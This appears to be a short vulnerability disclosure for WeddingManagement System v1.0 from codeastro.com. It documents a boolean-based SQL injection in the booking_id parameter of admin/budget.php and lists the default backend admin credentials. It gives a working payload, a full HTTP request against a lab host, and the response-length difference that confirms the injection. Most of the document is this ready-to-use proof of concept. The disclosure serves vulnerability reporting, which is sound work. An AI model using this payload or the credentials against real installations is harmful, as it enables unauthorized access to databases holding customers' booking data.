# WeddingManagement System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/admin/budget.php?booking_id=

Vulnerability location: /Wedding-Management/admin/budget.php?booking_id=,booking_id

[+] Payload: /Wedding-Management/admin/budget.php?booking_id=31%20and%20length(database())%20=%209&user_id=31 // Leak place ---> booking_id

Current database name: dbwedding,length is 9

```sql
GET /Wedding-Management/admin/budget.php?booking_id=31%20and%20length(database())%20=%209&user_id=31 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 8, Content-Length: 814

![image](https://user-images.githubusercontent.com/54017627/167993955-056cb6e9-5510-41a3-9709-c0305068b841.png)

![image](https://user-images.githubusercontent.com/54017627/167993880-25d999c6-8485-44c2-a797-6925b1165e37.png)

When length (database ()) = 9, Content-Length: 9894

![image](https://user-images.githubusercontent.com/54017627/167993912-5f66c673-bb34-4f4a-9744-b28b0f2924bb.png)

![image](https://user-images.githubusercontent.com/54017627/167993833-cceb8c47-7c3f-4df4-b9e2-65d0303d6e6a.png)
